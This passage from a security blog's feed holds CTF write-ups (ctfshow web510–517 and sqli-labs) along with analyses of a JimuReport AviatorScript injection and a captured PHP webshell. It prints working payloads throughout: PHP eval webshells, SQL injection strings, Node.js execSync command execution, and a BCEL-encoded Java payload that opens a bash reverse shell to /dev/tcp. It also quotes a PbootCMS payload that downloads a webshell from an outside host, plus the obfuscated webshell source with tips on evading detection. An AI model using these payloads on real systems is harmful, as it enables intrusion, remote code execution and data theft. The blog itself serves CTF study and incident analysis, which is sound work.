+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			if(preg_match('/php|sml|phar|\:|data|file|&lt;|&gt;|\`|\?|=/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
+                	$ret['msg']='请不要使用此功能';
+                	die(json_encode($ret));
+        		}
+
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+</code></pre>
+<p>现在基本上内容全过滤了，无法绕过。</p>
+<p>查看session文件发现刚好满足，user开头的格式，并且内容可控。<br>
+<img src="https://fallingskies22.github.io/post-images/1723459255367.png" alt="" loading="lazy"></p>
+<p>查看生成session代码<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+$action=$_GET['action'];
+
+...
+
+switch ($action) {
+	case 'check':
+		$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/file|or|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname,avatar from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+		if($user){
+			$_SESSION['user']=$user;
+			header('location:index.php?action=index');
+		}else{
+			templateUtil::render('error');
+		}
+		break;
+	case 'clear':
+		system('rm -rf cache/*');
+		die('cache clear');
+		break;
+	case 'login':
+		templateUtil::render($action);
+		break;
+	case 'index':
+		$user=$_SESSION['user'];
+		if($user){
+			templateUtil::render('index',$user);
+		}else{
+			header('location:index.php?action=login');
+		}
+		break;
+	case 'view':
+		$user=$_SESSION['user'];
+		if($user){
+			templateUtil::render($_GET['page'],$user);
+		}else{
+			header('location:index.php?action=login');
+		}
+		break;
+	case 'logout':
+		session_destroy();
+		header('location:index.php?action=login');
+		break;
+	default:
+		templateUtil::render($action);
+		break;
+}
+
+</code></pre>
+<p>在基本资料处修改昵称为<code>&lt;?php @eval($_POST[1])?&gt;</code></p>
+<p>使用文件包含点<br>
+<img src="https://fallingskies22.github.io/post-images/1723460673813.png" alt="" loading="lazy"></p>
+<h2 id="web511">web511</h2>
+<p>sess也过滤了<br>
+api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+extract($_POST);
+        if(preg_match('/php|sml|phar|\:|data|file|sess/i', $f)){
+                $ret['msg']='请不要使用此功能';
+                die(json_encode($ret));
+        }
+        if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+                include($f);
+        }else{
+                $ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+        }
+        $ret['msg']='查看成功';
+        die(json_encode($ret));
+</code></pre>
+<p>查看模板渲染代码<br>
+render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		$templateContent=fileUtil::read('templates/'.$template.'.sml');
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	}
+	public static  function shade($templateContent,$arg=array()){
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
+		}
+		return $templateContent;
+	}
+
+	public static function checkImage($templateContent,$arg=array()){
+		foreach ($arg as $key =&gt; $value) {
+			if(preg_match('/gopher|file/i', $value)){
+				$templateContent=str_replace('{{img:'.$key.'}}', '', $templateContent);
+			}
+			if(stripos($templateContent, '{{img:'.$key.'}}')){
+				$encode='';
+				if(file_exists(__DIR__.'/../cache/'.md5($value))){
+					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
+				}else{
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
+					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
+				}
+				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
+			}
+			
+		}
+		return $templateContent;
+	}
+	public static function checkConfig($templateContent){
+		$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+		foreach ($config as $key =&gt; $value) {
+			if(stripos($templateContent, '{{config:'.$key.'}}')){
+				$templateContent=str_replace('{{config:'.$key.'}}', $value, $templateContent);
+			}
+			
+		}
+		return $templateContent;
+	}
+
+	public static function checkVar($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				eval('$v='.$value.';');
+				$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+			}
+		}
+		return $templateContent;
+	}
+
+
+}
+</code></pre>
+<p><code>checkVar</code>函数中有<code>eval</code>函数，考虑利用它来命令执行。<br>
+这里要通过<code>stripos</code>函数，所以需要在标签前加其他字符。</p>
+<p>使用新增模板功能</p>
+<pre><code>new.sml
+123{{var:nickname}}
+</code></pre>
+<p>更改昵称为</p>
+<pre><code>`cat /flag_is_here_sf`
+</code></pre>
+<p>访问模板<br>
+<code>/index.php?action=view&amp;page=new</code></p>
+<h2 id="web512">web512</h2>
+<p>checkVar函数处增加了过滤</p>
+<pre><code class="language-php">&lt;?php
+public static function checkVar($templateContent,$arg){
+		$db=new db();
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				if(!preg_match('/\(|\[|\`|\'|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i', $value)){
+					eval('$v='.$value.';');
+					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+				}
+				
+			}
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>使用EOF来绕过引号</p>
+<pre><code>1;
+$a = &lt;&lt;&lt;EOF
+&lt;?php includ
+EOF;
+$b = &lt;&lt;&lt;EOF
+e $
+EOF;
+$c = &lt;&lt;&lt;EOF
+_POS
+EOF;
+$d = &lt;&lt;&lt;EOF
+T{1}?&gt;
+EOF;
+$e = &lt;&lt;&lt;EOF
+11.php
+EOF;
+$db-&gt;log-&gt;log=$e;
+$db-&gt;log-&gt;content=$a.$b.$c.$d;
+</code></pre>
+<p>使用登录处的sql注入来绕过修改信息时的长度限制。</p>
+<pre><code>action=check&amp;username=1'%20union%20select%20%22%31%3b%0a%24%61%20%3d%20%3c%3c%3c%45%4f%46%0a%3c%3f%70%68%70%20%69%6e%63%6c%75%64%0a%45%4f%46%3b%0a%24%62%20%3d%20%3c%3c%3c%45%4f%46%0a%65%20%24%0a%45%4f%46%3b%0a%24%63%20%3d%20%3c%3c%3c%45%4f%46%0a%5f%50%4f%53%0a%45%4f%46%3b%0a%24%64%20%3d%20%3c%3c%3c%45%4f%46%0a%54%7b%31%7d%3f%3e%0a%45%4f%46%3b%0a%24%65%20%3d%20%3c%3c%3c%45%4f%46%0a%31%31%2e%70%68%70%0a%45%4f%46%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%6c%6f%67%3d%24%65%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%63%6f%6e%74%65%6e%74%3d%24%61%2e%24%62%2e%24%63%2e%24%64%3b%22%2c2%2c3%23&amp;password=123&amp;random=1
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723474298038.png" alt="" loading="lazy"></figure>
+<p>创建模板文件</p>
+<pre><code>123{{var:username}}
+</code></pre>
+<p>访问模板文件后，生成11.php<br>
+<img src="https://fallingskies22.github.io/post-images/1723474360958.png" alt="" loading="lazy"></p>
+<h2 id="web513">web513</h2>
+<p>render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+public static function checkVar($templateContent,$arg){
+		$db=new db();
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				if(!preg_match('/\(|\[|\`|\'|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i', $value)){
+					eval('$v='.$value.';');
+					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+				}
+				
+			}
+		}
+		return $templateContent;
+	}
+
+	public static function checkFoot($templateContent){
+		if ( stripos($templateContent, '{{cnzz}}')) {
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$foot = $config['cnzz'];
+			if(is_file($foot)){
+				$foot=file_get_contents($foot);
+				include($foot);
+			}
+			
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>checkVar函数又增加了过滤，无法绕过。<br>
+增加了一个checkFoot函数。</p>
+<p>修改昵称为</p>
+<pre><code class="language-php">&lt;?=`cat /f*`?&gt;
+</code></pre>
+<p>创建模板文件path.sml</p>
+<pre><code>/tmp/sess_tjr3uviphhcn9f3cocfi77gl37
+</code></pre>
+<p>创建模板文件new.sml</p>
+<pre><code>123{{cnzz}}
+</code></pre>
+<p>修改系统配置中页面统计处为<code>/var/www/html/templates/path.sml</code></p>
+<p>访问<code>/index.php?action=view&amp;page=new</code>触发checkFoot函数即可。</p>
+<h2 id="web514">web514</h2>
+<p>checkFoot函数也增加了过滤</p>
+<pre><code class="language-php">&lt;?php
+public static function checkFoot($templateContent){
+		if ( stripos($templateContent, '{{cnzz}}')) {
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$foot = $config['cnzz'];
+			if(is_file($foot)){
+				$foot=file_get_contents($foot);
+				if(!preg_match('/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\{|\(|_/', $foot)){
+					include($foot);
+				}
+				
+			}
+			
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>创建模板文件path.sml</p>
+<pre><code>/var/www/html/config/settings
+</code></pre>
+<p>创建模板文件new.sml</p>
+<pre><code>123{{cnzz}}
+</code></pre>
+<p>修改系统配置中页面统计处为<code>/var/www/html/templates/path.sml</code></p>
+<p>修改系统配置中备案号为</p>
+<pre><code>&lt;?=`cat /flag_is_here_es`?&gt;
+</code></pre>
+<p>访问<code>/index.php?action=view&amp;page=new</code>触发checkFoot函数即可。</p>
+<h2 id="web515">web515</h2>
+<p>nodejs的题目</p>
+<pre><code class="language-js">var express = require('express');
+var _= require('lodash');
+var router = express.Router();
+
+/* GET users listing. */
+router.get('/', function(req, res, next) {
+  res.render('index', { title: '我是复读机' });
+});
+
+router.post('/',function(req,res,next){
+	if(req.body.user!=null){
+		msg = req.body.user;
+		if((msg.match(/proto|process|require|exec|var|'|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40){
+		  	res.render('index', { title: '敏感信息不复读' });
+		}else{
+			res.render('index', { title: eval(msg) });
+		}
+	}else{
+		res.render('index', { title: '我是复读机' });
+	}
+	 
+});
+module.exports = router;
+</code></pre>
+<p>命令执行绕过<br>
+利用request参数来绕过</p>
+<p>payload</p>
+<pre><code>?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
+
+user=eval(req.query.id)
+</code></pre>
+<h2 id="web516">web516</h2>
+<p>routes/index.js</p>
+<pre><code class="language-js">const router = require('koa-router')()
+const User = require('../models/User.js')
+const md5 = require('md5-node')
+
+router.get('/', async (ctx, next) =&gt; {
+	await ctx.render('index',{msg:'ctfshow'});
+	await next();
+
+});
+
+router.post('/signin',async(ctx,next)=&gt;{
+  const username = ctx.request.body.username;
+  const password = ctx.request.body.password;
+  if(username=='admin'){
+  	ctx.body={
+  		code:'403',
+  		msg:'you are not admin'
+  	};
+  	return;
+  }
+  const user = await User.findAll({
+  	where:{
+  		username:username,
+  		password:password
+  	}
+  });
+
+  if(user[0]!==undefined){
+  	ctx.body={
+  		code:'200',
+  		url:'user/'+user[0].id
+  	}
+  }else{
+  	ctx.body={
+  		code:'404',
+  		msg:'login failed'
+  	};
+  }
+  
+});
+
+router.post('/signup',async(ctx,next)=&gt;{
+	  const username = ctx.request.body.username;
+	  const password = ctx.request.body.password;
+	  if(username=='admin'){
+	  	ctx.body={
+  		code:'403',
+  		msg:'you are not admin'
+  		};
+	  	return;
+	  }
+	  const u = await User.create({username:username,password:password})
+	  ctx.body={
+	  	code:0,
+	  	msg:'注册成功'
+	  }
+});
+
+router.get('/user/:id',async(ctx,next)=&gt;{
+	const id=ctx.params.id;
+	if(id==1){
+	  	ctx.body={
+  		code:'403',
+  		msg:'非管理员无权查看'
+  		};
+	  	return;
+	  }
+	const user = await User.findAll({
+		where:{
+			id:id
+		}
+	});
+
+	if(user!==undefined){
+		ctx.body='&lt;h3&gt;Hello '+user[0].username+'&lt;/h3&gt; your name is: '+user[0].username+' your id is: '+user[0].id+ ' your password is: '+eval('md5('+user[0].password+')');
+	}else{
+		ctx.render('/');
+	}
+});
+module.exports = router
+</code></pre>
+<p>app.js</p>
+<pre><code class="language-js">const Koa = require('koa')
+const app = new Koa()
+const views = require('koa-views')
+const json = require('koa-json')
+const onerror = require('koa-onerror')
+const bodyparser = require('koa-bodyparser')
+const logger = require('koa-logger')
+
+const index = require('./routes/index')
+const users = require('./routes/users')
+
+// error handler
+onerror(app)
+
+// middlewares
+app.use(bodyparser({
+  enableTypes:['json', 'form', 'text']
+}))
+app.use(json())
+app.use(logger())
+app.use(require('koa-static')(__dirname + '/public'))
+
+app.use(views(__dirname + '/views', {
+  extension: 'ejs'
+}))
+
+// logger
+app.use(async (ctx, next) =&gt; {
+  const start = new Date()
+  await next()
+  const ms = new Date() - start
+  console.log(`${ctx.method} ${ctx.url} - ${ms}ms`)
+})
+
+app.use(async(ctx,next)=&gt;{
+	if(ctx.request.body.password!==undefined &amp;&amp; (ctx.request.body.password.match(/proto|JSON|parse|process|require|exec|var|merge|response|body|request/))!==null){
+		return
+	}else{
+		await next()
+	}
+	
+})
+
+// routes
+app.use(index.routes(), index.allowedMethods())
+app.use(users.routes(), users.allowedMethods())
+
+// error-handling
+app.on('error', (err, ctx) =&gt; {
+  console.error('server error', err, ctx)
+});
+
+module.exports = app
+</code></pre>
+<p>注册账号</p>
+<pre><code>username=hello&amp;password=1)%2beval(eval(`ctx.requ`%2b`est.query.id`)
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723630212531.png" alt="" loading="lazy"></figure>
+<p>登录账号后通过id访问</p>
+<pre><code>/user/16?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723630246169.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[积木报表存在aviator表达式注入漏洞]]></title>
+        <id>https://fallingskies22.github.io/post/ji-mu-bao-biao-cun-zai-aviatort-biao-da-shi-zhu-ru-lou-dong/</id>
+        <link href="https://fallingskies22.github.io/post/ji-mu-bao-biao-cun-zai-aviatort-biao-da-shi-zhu-ru-lou-dong/">
+        </link>
+        <updated>2024-08-01T14:33:42.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>先不写</p>
+<h1 id="介绍">介绍</h1>
+<p>https://github.com/killme2008/aviatorscript</p>
+<p>AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。</p>
+<p>积木报表<br>
+https://github.com/jeecgboot/JimuReport</p>
+<p>一款免费的数据可视化报表，含报表、仪表盘和大屏设计，像搭建积木一样在线设计报表！功能涵盖，数据报表、打印设计、图表报表、大屏设计等！</p>
+<p>https://github.com/jeecgboot/JeecgBoot<br>
+在jeecg-boot中有集成积木报表，且非常常见。</p>
+<h2 id="流量捕获">流量捕获</h2>
+<p>这里略，反正就是被漏洞打了，然后抓到流量了，不过流量只有一半。。。。</p>
+<p>head头</p>
+<pre><code class="language-http">POST /jmreport/save HTTP/2
+Content-Type: application/json
+</code></pre>
+<p>post数据如下所示，看到ReflectUtils.defineClass就知道应该是注入内存马了。</p>
+<pre><code class="language-json">{&quot;designerObj&quot;:{&quot;id&quot;:&quot;949097799684018176&quot;,&quot;code&quot;:&quot;20240511102253&quot;,&quot;name&quot;:&quot;test&quot;,&quot;note&quot;:null,&quot;status&quot;:null,&quot;type&quot;:&quot;printinfo&quot;,&quot;jsonStr&quot;:&quot;{\&quot;loopBlockList\&quot;:[],\&quot;printConfig\&quot;:{\&quot;layout\&quot;:\&quot;portrait\&quot;,\&quot;printCallBackUrl\&quot;:\&quot;\&quot;,\&quot;paper\&quot;:\&quot;A4\&quot;,\&quot;isBackend\&quot;:false,\&quot;width\&quot;:210,\&quot;definition\&quot;:1,\&quot;marginX\&quot;:10,\&quot;height\&quot;:297,\&quot;marginY\&quot;:10},\&quot;hidden\&quot;:{\&quot;rows\&quot;:[],\&quot;cols\&quot;:[]},\&quot;dbexps\&quot;:[],\&quot;dicts\&quot;:[],\&quot;freeze\&quot;:\&quot;A1\&quot;,\&quot;dataRectWidth\&quot;:100,\&quot;autofilter\&quot;:{},\&quot;validations\&quot;:[],\&quot;cols\&quot;:{\&quot;len\&quot;:50},\&quot;area\&quot;:false,\&quot;pyGroupEngine\&quot;:false,\&quot;excel_config_id\&quot;:\&quot;949097799684018176\&quot;,\&quot;hiddenCells\&quot;:[],\&quot;zonedEditionList\&quot;:[],\&quot;rows\&quot;:{\&quot;0\&quot;:{\&quot;cells\&quot;:{\&quot;0\&quot;:{\&quot;text\&quot;:\&quot;123\&quot;}}},\&quot;len\&quot;:100},\&quot;rpbar\&quot;:{\&quot;show\&quot;:true,\&quot;pageSize\&quot;:\&quot;\&quot;,\&quot;btnList\&quot;:[]},\&quot;fixedPrintHeadRows\&quot;:[],\&quot;fixedPrintTailRows\&quot;:[],\&quot;displayConfig\&quot;:{},\&quot;background\&quot;:false,\&quot;name\&quot;:\&quot;sheet1\&quot;,\&quot;styles\&quot;:[],\&quot;freezeLineColor\&quot;:\&quot;rgb(185, 185, 185)\&quot;,\&quot;merges\&quot;:[]}&quot;,&quot;apiUrl&quot;:null,&quot;apiMethod&quot;:null,&quot;apiCode&quot;:null,&quot;thumb&quot;:null,&quot;template&quot;:0,&quot;createBy&quot;:&quot;15296066620&quot;,&quot;createTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;updateBy&quot;:null,&quot;updateTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;dataList&quot;:null,&quot;dictInfo&quot;:null,&quot;delFlag&quot;:0,&quot;viewCount&quot;:0,&quot;cssStr&quot;:null,&quot;jsStr&quot;:null,&quot;pyStr&quot;:null,&quot;tenantId&quot;:null,&quot;isRefresh&quot;:null,&quot;shareViewUrl&quot;:null},&quot;name&quot;:&quot;sheet1&quot;,&quot;freeze&quot;:&quot;A1&quot;,&quot;freezeLineColor&quot;:&quot;rgb(185, 185, 185)&quot;,&quot;styles&quot;:[],&quot;displayConfig&quot;:{},&quot;printConfig&quot;:{&quot;layout&quot;:&quot;portrait&quot;,&quot;printCallBackUrl&quot;:&quot;&quot;,&quot;paper&quot;:&quot;A4&quot;,&quot;isBackend&quot;:false,&quot;width&quot;:210,&quot;definition&quot;:1,&quot;marginX&quot;:10,&quot;height&quot;:297,&quot;marginY&quot;:10},&quot;merges&quot;:[],&quot;rows&quot;:{&quot;0&quot;:{&quot;cells&quot;:{&quot;0&quot;:{&quot;text&quot;:&quot;123&quot;},&quot;1&quot;:{}}},&quot;9&quot;:{&quot;cells&quot;:{&quot;6&quot;:{&quot;text&quot;:&quot;=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('org.apache.catalina.filters.$ProxyInterceptor$$Lambda$1',Base64Utils.decodeFromString('yv66vgAAAD
+</code></pre>
+<h2 id="分析流程">分析流程</h2>
+<p>不知道具体啥漏洞，一脸懵，但是大概知道是text参数里可以命令执行。</p>
+<p>去网上搜漏洞，搜到一个人发现的bug🤣</p>
+<p>https://www.cnblogs.com/voyager-fu/p/16091838.html</p>
+<p>他在使用有单独的<code>=</code>在text中时会出错，分析具体代码发现，程序会将<code>=</code>后的字符当作AviatorScript来解析。这个也和捕获的流量很符合😋</p>
+<p>继续去后的字符当作AviatorScript官网看历史漏洞，发现很早就有人发现存在表达式漏洞<br>
+https://github.com/killme2008/aviatorscript/issues/421<br>
+项目作者建议是增加鉴权和控制可以访问的 class 白名单（反正和作者没关系😤）</p>
+<p>看到最下面还有人提到积木报表中的多个依赖安全漏洞（就不修）🤣</p>
+<p>根据文章提示，使用BCELClassloader加载BCEL编码的形式完成RCE。</p>
+<p>官网地址:<br>
+http://www.jimureport.com/</p>
+<p>创建一张报表，然后打开<br>
+<img src="https://fallingskies22.github.io/post-images/1722527110533.png" alt="" loading="lazy"></p>
+<p>点击保存，就会有/jmreport/save的数据包了。<br>
+<img src="https://fallingskies22.github.io/post-images/1722526832871.png" alt="" loading="lazy"></p>
+<p>在一个text参数中输入payload<br>
+<img src="https://fallingskies22.github.io/post-images/1722527046527.png" alt="" loading="lazy"><br>
+payload</p>
+<pre><code>=((c=(Class.forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A',true,new com.sun.org.apache.bcel.internal.util.ClassLoader())))+(c.exec('bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/ip/1337 0&gt;&amp;1')))
+</code></pre>
+<p>在访问一下生成的报表，这里使用接口是/jmreport/show</p>
+<p>访问后看见文本内容变成下面这样了，这个UNIXProcess@6abe63e7就代表执行成功了。<br>
+<img src="https://fallingskies22.github.io/post-images/1722527227775.png" alt="" loading="lazy"></p>
+<p>然后看看vps上，成功获取到shell<br>
+<img src="https://fallingskies22.github.io/post-images/1722527302566.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722527309213.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[PHP webshell]记一次捕获的php免杀马]]></title>
+        <id>https://fallingskies22.github.io/post/php-webshellji-yi-ci-bu-huo-de-php-mian-sha-ma/</id>
+        <link href="https://fallingskies22.github.io/post/php-webshellji-yi-ci-bu-huo-de-php-mian-sha-ma/">
+        </link>
+        <updated>2024-07-27T02:22:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>无聊的HW时候，千篇一律的扫描器，终于遇到一个半人工，payload有点质量。</p>
+<h2 id="捕获payload">捕获payload</h2>
+<pre><code class="language-http">GET /{pboot:if((&quot;file_put_co&quot;.&quot;ntents&quot;)(&quot;temp.php&quot;,(&quot;base6&quot;.&quot;4_decode&quot;)(&quot;PD9waHAgCmZpbGVfcHV0X2NvbnRlbnRzKCcuL2NvcmUvYmFzaWMvZnVuLnBocCcsZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9kLnNvZ291YWQudmlwL3R4dC9tYTEudHh0JykpOwplY2hvICd0ZW1wMTExODg4JzsKdW5saW5rKF9fRklMRV9fKTs=&quot;)))}{/pboot:if}/../../?p=20 HTTP/1.1 
+Accept-Encoding:identity 
+Host:
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 
+Referer:http://n666888.com 
+Connection:close 
+</code></pre>
+<h2 id="分析">分析</h2>
+<p>具体这个是哪个漏洞的payload不太清楚，网上搜了一下好像是pbootcms，但没有搜到具体的漏洞信息。</p>
+<p>直接把base64编码解码看看。</p>
+<pre><code class="language-php">&lt;?php 
+file_put_contents('./core/basic/fun.php',file_get_contents('http://d.sogouad.vip/txt/ma1.txt'));
+echo 'temp111888';
+unlink(__FILE__);
+</code></pre>
+<p>访问链接地址，发现是个混淆过的php马。</p>
+<p>去微步情报社区搜索相关域名信息，发现不只这一个样本。</p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722047676843.png" alt="" loading="lazy"></figure>
+<p>而且ma1.txt这个文件已经被标红了，我们直接找个绿的看看。</p>
+<p><a href="https://s.threatbook.com/report/file/448bd70dce8919641f5b2678b8588b6f390772f6a2b7927f6ac7dfad0bf46ea2">yj.txt</a></p>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1722047800332.png" alt="" loading="lazy"></figure>
+<p>只有一个引擎检出，而且动态分析失败。</p>
+<pre><code class="language-php">&lt;?php
+global $phpjiami_decrypt;
+$phpjiami_decrypt['��î����Ë����֯��������֔��å��']=base64_decode('c3RybGVu'); 
+$phpjiami_decrypt['�������������Ĉ�������Ô���È֯�']=base64_decode('Y2hy');
+$phpjiami_decrypt['����ֈ������֯�������È���������']=base64_decode('aGV4ZGVj'); 
+$phpjiami_decrypt['�þ�Ë���־����È֮Ë��Ô�������']=base64_decode('aGV4VG9TdHI='); ?&gt;
+
+&lt;?php
+class _ {
+    static public $phpcms=Null;
+    function __construct($l=&quot;error&quot;){
+        self::$phpcms=$l;
+        @eval(null.null.self::$phpcms);
+    }
+}
+function hexToStr($hex){
+    $str=&quot;&quot;;
+    for($i=0;$i&lt;$GLOBALS['phpjiami_decrypt']['��î����Ë����֯��������֔��å��']($hex)-1;$i+=2)
+        $str.=$GLOBALS['phpjiami_decrypt']['�������������Ĉ�������Ô���È֯�']($GLOBALS['phpjiami_decrypt']['����ֈ������֯�������È���������']($hex[$i].$hex[$i+1]));
+
+    return $str;
+
+}
+
+$error =null.$GLOBALS['phpjiami_decrypt']['�þ�Ë���־����È֮Ë��Ô�������'](@$_POST[&quot;admin@888&quot;]);
+$d =new _($error);
+
+?&gt;
+</code></pre>
+<p>可以看到这里主要是使用乱码的变量名，来混淆样本，这里自己构造时可以用hex编辑工具来操作。<br>
+<img src="https://fallingskies22.github.io/post-images/1722048087404.png" alt="" loading="lazy"></p>
+<p>然后使用了null.null.self::$phpcms来传递参数，让查杀软件识别不了参数传递关系。</p>
+<p>大概就是这样了，然后传递hex编码后的admin@888参数，即可执行命令。</p>
+<p>感觉这里如果为了再让流量分析困难点，可以将hexToStr中的<code>$hex[$i].$hex[$i+1])</code>交换位置，这样从流量不能一眼发现异常的hex编码。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]sqli-labs]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowsqli-labs/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowsqli-labs/">
+        </link>
+        <updated>2024-07-21T03:23:41.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web517">web517</h2>
+<p>union注入，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://7409729e-2d15-40b9-8c92-c96092d2a608.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1' union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
